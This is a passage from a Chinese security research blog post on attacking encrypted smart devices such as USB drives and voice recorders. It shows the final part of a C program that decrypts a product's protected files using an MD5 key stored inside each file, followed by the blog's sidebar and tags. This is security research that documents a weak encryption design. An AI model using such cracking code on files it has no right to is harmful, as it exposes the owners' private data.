解密所有字节</span></span><br><span class="line">        fread_s(md5, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">1</span>, pFile);</span><br><span class="line">        encSize = fileLen;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"md5: %s\n"</span>, md5);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取密文</span></span><br><span class="line">    <span class="comment">// char content[] = "\xfa\xe3\x80";</span></span><br><span class="line">    <span class="keyword">char</span>* content = <span class="literal">NULL</span>;</span><br><span class="line">    content = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(fileLen + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (content == <span class="literal">NULL</span>)<span class="comment">//申请后判定是否申请成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(pFile, <span class="number">0</span>, SEEK_SET);  <span class="comment">//首先移动到文件开头再读取</span></span><br><span class="line">    fread_s(content, fileLen + <span class="number">1</span>, fileLen, <span class="number">1</span>, pFile);</span><br><span class="line">    fclose(pFile);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 调用解密函数，或解密首部 0x1000 字节</span></span><br><span class="line">    <span class="keyword">if</span> (!enc_fun(content, md5, encSize))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"解密失败\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 是否需要解密尾部 0x1000 字节</span></span><br><span class="line">    <span class="keyword">if</span> (enctail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 解密尾部 0x1000 字节</span></span><br><span class="line">        <span class="keyword">char</span>* tailcont = content + fileLen - <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">if</span> (!enc_fun(tailcont, md5, encSize)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"解密失败\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//printf("写入新文件\n");</span></span><br><span class="line">    <span class="keyword">int</span> nlen = <span class="built_in">strlen</span>(pfilename);</span><br><span class="line">    pfilename[nlen - <span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    FILE* pfile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (fopen_s(&amp;pfile, pfilename, <span class="string">"wb"</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建文件失败\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(content, fileLen, <span class="number">1</span>, pfile);</span><br><span class="line">    fclose(pfile);</span><br><span class="line">    <span class="built_in">free</span>(content);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"解密文件写入成功!!!\n\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://yaseng.org/encryption-hardware-attack-and-defense-2.html" data-id="ckkqsfn9l00ya2cwmqlawdaay" class="article-share-link">分享到</a><div class="tags"><a href="/tags/移动硬盘破解/">移动硬盘破解</a><a href="/tags/智能硬盘破解/">智能硬盘破解</a><a href="/tags/固态加密硬盘破解/">固态加密硬盘破解</a><a href="/tags/u-盘破解/">u 盘破解</a><a href="/tags/录音笔破解/">录音笔破解</a></div><div class="post-nav"><a href="/cracking_hardware_aes256_encrypted_pssd_in_butian_2020.html" class="pre">破解 aes 256 硬件加密固态硬盘 (补天大赛)</a><a href="/ubertoothone-1.html" class="next">Ubertooth One 使用系列 (一) — 破解蓝牙锁</a></div></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="http://yaseng.org"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Hack/">Hack</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Hack/学习资料/">学习资料</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hack/安全参考/">安全参考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hack/技术文章/">技术文章</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Yaseng/">Yaseng</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Yaseng/原创作品/">原创作品</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内核安全/">内核安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端安全/">前端安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/区块链安全/">区块链安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创作品/">原创作品</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习资料/">学习资料</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全参考/">安全参考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术文章/">技术文章</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/技术文章/代码审计/">代码审计</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/数据安全/">数据安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线电安全/">无线电安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/物理攻击/">物理攻击</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/物联网安全/">物联网安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/终端安全/">终端安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/芯片安全/">芯片安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/西部大开发/">西部大开发</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/java-漏洞/" style="font-size: 15px;">java 漏洞</a> <a href="/tags/discuz-插件/" style="font-size: 15px;">discuz 插件</a> <a href="/tags/原创作品/" style="font-size: 15px;">原创作品</a> <a href="/tags/asm/" style="font-size: 15px;">asm</a> <a href="/tags/wget/" style="font-size: 15px;">wget</a> <a href="/tags/90sec/" style="font-size: 15px;">90sec</a> <a href="/tags/代码审计/" style="font-size: 15px;">代码审计</a> <a href="/tags/Yaseng/" style="font-size: 15px;">Yaseng</a> <a href="/tags/91736cms-漏洞/" style="font-size: 15px;">91736cms 漏洞</a> <a href="/tags/codeplay/" style="font-size: 15px;">codeplay</a> <a href="/tags/硬件安全/" style="font-size: 15px;">硬件安全</a> <a href="/tags/goahead/" style="font-size: 15px;">goahead</a> <a href="/tags/LimeSDR/" style="font-size: 15px;">LimeSDR</a> <a href="/tags/无线电安全/" style="font-size: 15px;">无线电安全</a> <a href="/tags/火腿肠/" style="font-size: 15px;">火腿肠</a> <a href="/tags/终端安全/" style="font-size: 15px;">终端安全</a> <a href="/tags/绕过终端沙盒/" style="font-size: 15px;">绕过终端沙盒</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/xss-盲打/" style="font-size: 15px;">xss 盲打</a> <a href="/tags/zgrab/" style="font-size: 15px;">zgrab</a> <a href="/tags/zmap/" style="font-size: 15px;">zmap</a> <a href="/tags/无状态扫描/" style="font-size: 15px;">无状态扫描</a> <a href="/tags/运维/" style="font-size: 15px;">运维</a> <a href="/tags/Shellshock/" style="font-size: 15px;">Shellshock</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/Burp-Suite/" style="font-size: 15px;">Burp Suite</a> <a href="/tags/验证码识别/" style="font-size: 15px;">验证码识别</a> <a href="/tags/代理-ip/" style="font-size: 15px;">代理 ip</a> <a href="/tags/渗透测试/" style="font-size: 15px;">渗透测试</a> <a href="/tags/芯片安全/" style="font-size: 15px;">芯片安全</a> <a href="/tags/LoRa-协议/" style="font-size: 15px;">LoRa 协议</a> <a href="/tags/LoRa-嗅探/" style="font-size: 15px;">LoRa 嗅探</a> <a href="/tags/LoRa-协议分析/" style="font-size: 15px;">LoRa 协议分析</a> <a href="/tags/CatWAN-USB-Stick/" style="font-size: 15px;">CatWAN USB Stick</a> <a href="/tags/免杀/" style="font-size: 15px;">免杀</a> <a href="/tags/cmseasy/" style="font-size: 15px;">cmseasy</a> <a href="/tags/u盘破解/" style="font-size: 15px;">u盘破解</a> <a href="/tags/aes256-硬件加密破解/" style="font-size: 15px;">aes256 硬件加密破解</a> <a href="/tags/指纹加密u盘破解/" style="font-size: 15px;">指纹加密u盘破解</a> <a href="/tags/侧信道攻击/" style="font-size: 15px;">侧信道攻击</a> <a href="/tags/电磁攻击/" style="font-size: 15px;">电磁攻击</a> <a href="/tags/移动硬盘破解/" style="font-size: 15px;">移动硬盘破解</a> <a href="/tags/智能硬盘破解/" style="font-size: 15px;">智能硬盘破解</a> <a href="/tags/固态加密硬盘破解/" style="font-size: 15px;">固态加密硬盘破解</a> <a href="/tags/破解大赛/" style="font-size: 15px;">破解大赛</a> <a href="/tags/补天大赛/" style="font-size: 15px;">补天大赛</a> <a href="/tags/极客大赛/" style="font-size: 15px;">极客大赛</a> <a href="/tags/黑客大赛/" style="font-size: 15px;">黑客大赛</a> <a href="/tags/CVE-2014-4877/" style="font-size: 15px;">CVE-2014-4877</a> <a href="/tags/Defcon/" style="font-size: 15px;">Defcon</a> <a href="/tags/长沙线下沙龙/" style="font-size: 15px;">长沙线下沙龙</a> <a href="/tags/黑客沙龙/" style="font-size: 15px;">黑客沙龙</a> <a href="/tags/技术沙龙/" style="font-size: 15px;">技术沙龙</a> <a href="/tags/discuz/" style="font-size: 15px;">discuz</a> <a href="/tags/discuz-漏洞/" style="font-size: 15px;">discuz 漏洞</a> <a href="/tags/discuz-getshell/" style="font-size: 15px;">discuz getshell</a> <a href="/tags/uauc作品/" style="font-size: 15px;">uauc作品</a> <a href="/tags/discuz插件/" style="font-size: 15px;">discuz插件</a> <a href="/tags/c0deplay/" style="font-size: 15px;">c0deplay</a> <a href="/tags/firefox扩展/" style="font-size: 15px;">firefox扩展</a> <a href="/tags/firefox插件/" style="font-size: 15px;">firefox插件</a> <a href="/tags/Firefox/" style="font-size: 15px;">Firefox</a> <a href="/tags/firefox-扩展/" style="font-size: 15px;">firefox 扩展</a> <a href="/tags/firefox-插件/" style="font-size: 15px;">firefox 插件</a> <a href="/tags/无人超市/" style="font-size: 15px;">无人超市</a> <a href="/tags/无人超市安全/" style="font-size: 15px;">无人超市安全</a> <a href="/tags/无人超市破解/" style="font-size: 15px;">无人超市破解</a> <a href="/tags/无人超市零元购/" style="font-size: 15px;">无人超市零元购</a> <a href="/tags/安全参考/" style="font-size: 15px;">安全参考</a> <a href="/tags/漏洞月报/" style="font-size: 15px;">漏洞月报</a> <a href="/tags/xss绕过/" style="font-size: 15px;">xss绕过</a> <a href="/tags/智能锁/" style="font-size: 15px;">智能锁</a> <a href="/tags/蓝牙攻击/" style="font-size: 15px;">蓝牙攻击</a> <a href="/tags/hsts/" style="font-size: 15px;">hsts</a> <a href="/tags/hsts-bypass/" style="font-size: 15px;">hsts bypass</a> <a href="/tags/mitmf/" style="font-size: 15px;">mitmf</a> <a href="/tags/中间人攻击/" style="font-size: 15px;">中间人攻击</a> <a href="/tags/物联网安全/" style="font-size: 15px;">物联网安全</a> <a href="/tags/智能硬件安全/" style="font-size: 15px;">智能硬件安全</a> <a href="/tags/锁具安全/" style="font-size: 15px;">锁具安全</a> <a href="/tags/物理安全/" style="font-size: 15px;">物理安全</a> <a href="/tags/jboss-漏洞/" style="font-size: 15px;">jboss 漏洞</a> <a href="/tags/jquery-barrager-js/" style="font-size: 15px;">jquery.barrager.js</a> <a href="/tags/网页弹幕/" style="font-size: 15px;">网页弹幕</a> <a href="/tags/hexo-弹幕/" style="font-size: 15px;">hexo 弹幕</a> <a href="/tags/jQuery-弹幕插件/" style="font-size: 15px;">jQuery 弹幕插件</a> <a href="/tags/WordPress-插件/" style="font-size: 15px;">WordPress 插件</a> <a href="/tags/《黑客防线》/" style="font-size: 15px;">《黑客防线》</a> <a href="/tags/密码爆破/" style="font-size: 15px;">密码爆破</a> <a href="/tags/getshell/" style="font-size: 15px;">getshell</a> <a href="/tags/metinfo/" style="font-size: 15px;">metinfo</a> <a href="/tags/CVE-2014-9512/" style="font-size: 15px;">CVE-2014-9512</a> <a href="/tags/symbolic-link-attack/" style="font-size: 15px;">symbolic link attack</a> <a href="/tags/Mysql-注入-ddos/" style="font-size: 15px;">Mysql 注入 ddos</a> <a href="/tags/phpdisk/" style="font-size: 15px;">phpdisk</a> <a href="/tags/csrf/" style="font-size: 15px;">csrf</a> <a href="/tags/phpmywind-漏洞/" style="font-size: 15px;">phpmywind 漏洞</a> <a href="/tags/Rsync/" style="font-size: 15px;">Rsync</a> <a href="/tags/加密域可逆水印/" style="font-size: 15px;">加密域可逆水印</a> <a href="/tags/鲁棒可逆水印/" style="font-size: 15px;">鲁棒可逆水印</a> <a href="/tags/信息伪装/" style="font-size: 15px;">信息伪装</a> <a href="/tags/区块链安全/" style="font-size: 15px;">区块链安全</a> <a href="/tags/智能合约审计/" style="font-size: 15px;">智能合约审计</a> <a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-应用安全/" style="font-size: 15px;">android 应用安全</a> <a href="/tags/android安全/" style="font-size: 15px;">android安全</a> <a href="/tags/MITMf/" style="font-size: 15px;">MITMf</a> <a href="/tags/php代码审计/" style="font-size: 15px;">php代码审计</a> <a href="/tags/内核/" style="font-size: 15px;">内核</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a> <a href="/tags/内核hook/" style="font-size: 15px;">内核hook</a> <a href="/tags/fddy/" style="font-size: 15px;">fddy</a> <a href="/tags/xdcms/" style="font-size: 15px;">xdcms</a> <a href="/tags/Xiuno/" style="font-size: 15px;">Xiuno</a> <a href="/tags/xss白盒分析/" style="font-size: 15px;">xss白盒分析</a> <a href="/tags/xss-利用平台/" style="font-size: 15px;">xss 利用平台</a> <a href="/tags/xssing/" style="font-size: 15px;">xssing</a> <a href="/tags/c/" style="font-size: 15px;">c++</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/exp/" style="font-size: 15px;">exp</a> <a href="/tags/分布式扫描系统/" style="font-size: 15px;">分布式扫描系统</a> <a href="/tags/毕业论文/" style="font-size: 15px;">毕业论文</a> <a href="/tags/物理攻击/" style="font-size: 15px;">物理攻击</a> <a href="/tags/ChipWhisperer/" style="font-size: 15px;">ChipWhisperer</a> <a href="/tags/毛刺攻击/" style="font-size: 15px;">毛刺攻击</a> <a href="/tags/路由器漏洞/" style="font-size: 15px;">路由器漏洞</a> <a href="/tags/JTAGulator/" style="font-size: 15px;">JTAGulator</a> <a href="/tags/jtag/" style="font-size: 15px;">jtag</a> <a href="/tags/u-盘破解/" style="font-size: 15px;">u 盘破解</a> <a href="/tags/录音笔破解/" style="font-size: 15px;">录音笔破解</a> <a href="/tags/Android-反编译/" style="font-size: 15px;">Android 反编译</a> <a href="/tags/迅雷云播/" style="font-size: 15px;">迅雷云播</a> <a href="/tags/智能锁安全/" style="font-size: 15px;">智能锁安全</a> <a href="/tags/智能锁破解/" style="font-size: 15px;">智能锁破解</a> <a href="/tags/指纹锁安全/" style="font-size: 15px;">指纹锁安全</a> <a href="/tags/指纹锁破解/" style="font-size: 15px;">指纹锁破解</a> <a href="/tags/长毛开锁/" style="font-size: 15px;">长毛开锁</a> <a href="/tags/长毛锁王/" style="font-size: 15px;">长毛锁王</a> <a href="/tags/硬件分析/" style="font-size: 15px;">硬件分析</a> <a href="/tags/UART串口调试/" style="font-size: 15px;">UART串口调试</a> <a href="/tags/硬件修改/" style="font-size: 15px;">硬件修改</a> <a href="/tags/硬改/" style="font-size: 15px;">硬改</a> <a href="/tags/硬破/" style="font-size: 15px;">硬破</a> <a href="/tags/魔改/" style="font-size: 15px;">魔改</a> <a href="/tags/ZigBee/" style="font-size: 15px;">ZigBee</a> <a href="/tags/KillerBee/" style="font-size: 15px;">KillerBee</a> <a href="/tags/ZigBee-安全/" style="font-size: 15px;">ZigBee 安全</a> <a href="/tags/锁具-ctf/" style="font-size: 15px;">锁具 ctf</a> <a href="/tags/智能快递柜破解/" style="font-size: 15px;">智能快递柜破解</a> <a href="/tags/智能终端安全/" style="font-size: 15px;">智能终端安全</a> <a href="/tags/Ubertooth-One/" style="font-size: 15px;">Ubertooth One</a> <a href="/tags/重放攻击/" style="font-size: 15px;">重放攻击</a> <a href="/tags/蓝牙锁破解/" style="font-size: 15px;">蓝牙锁破解</a> <a href="/tags/无线电/" style="font-size: 15px;">无线电</a> <a href="/tags/无线门铃逆向/" style="font-size: 15px;">无线门铃逆向</a> <a href="/tags/指纹识别/" style="font-size: 15px;">指纹识别</a> <a href="/tags/开锁/" style="font-size: 15px;">开锁</a> <a href="/tags/声波锁破解/" style="font-size: 15px;">声波锁破解</a> <a href="/tags/保险柜破解/" style="font-size: 15px;">保险柜破解</a> <a href="/tags/共享单车破解/" style="font-size: 15px;">共享单车破解</a> <a href="/tags/加密U盘破解/" style="font-size: 15px;">加密U盘破解</a> <a href="/tags/鬼吹灯/" style="font-size: 15px;">鬼吹灯</a> <a href="/tags/YARD-Stick-One/" style="font-size: 15px;">YARD Stick One</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/killerbee_1.html">KillBee 框架的使用（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/catwan_usb_stick.html">开源 LoRa 协议分析工具 CatWAN USB Stick 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/defcon-group-860731-2020.html">Defcon Group 860731 2020  长沙线下沙龙</a></li><li class="post-list-item"><a class="post-list-link" href="/cracking_hardware_aes256_encrypted_pssd_in_butian_2020.html">破解 aes 256 硬件加密固态硬盘 (补天大赛)</a></li><li class="post-list-item"><a class="post-list-link" href="/encryption-hardware-attack-and-defense-2.html">加密设备攻防(二）- 智能设备篇</a></li><li class="post-list-item"><a class="post-list-link" href="/ubertoothone-1.html">Ubertooth One 使用系列 (一) — 破解蓝牙锁</a></li><li class="post-list-item"><a class="post-list-link" href="/yardstickone-1.html">YARD Stick One 使用系列 (一)</a></li><li class="post-list-item"><a class="post-list-link" href="/king-of-lock-4.html">《锁王创造营》 第四关：两会专题</a></li><li class="post-list-item"><a class="post-list-link" href="/king-of-lock-3.html">《锁王创造营》第三关：釜底抽薪</a></li><li class="post-list-item"><a class="post-list-link" href="/king-of-lock-2.html">《锁王创造营》第二关：暗度陈仓</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.yaseng.org" title="Yaseng" target="_blank">Yaseng</a><ul></ul><a href="http://www.uauc.net" title="UaUc Net" target="_blank">UaUc Net</a><ul></ul><a href="http://future-sec.com" title="Future-sec" target="_blank">Future-sec</a><ul></ul><a href="http://secoff.net" title="b4dboy" target="_blank">b4dboy</a><ul></ul><a href="https://www.bg7ywl.com" title="BG7YWL's Blog" target="_blank">BG7YWL's Blog</a><ul></ul><a href="http://uauc.taobao.com" title="UaUc Taobao" target="_blank">UaUc Taobao</a><ul></ul><a href="http://iot-security.wiki" title="物联网安全百科" target="_blank">物联网安全百科</a><ul></ul><a href="https://shop135619923.taobao.com" title="IOT 安全研究小地铺" target="_blank">IOT 安全研究小地铺</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">Yaseng.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="/js/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?63c0f1a94f0f01d28a0a7fe601154e81";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>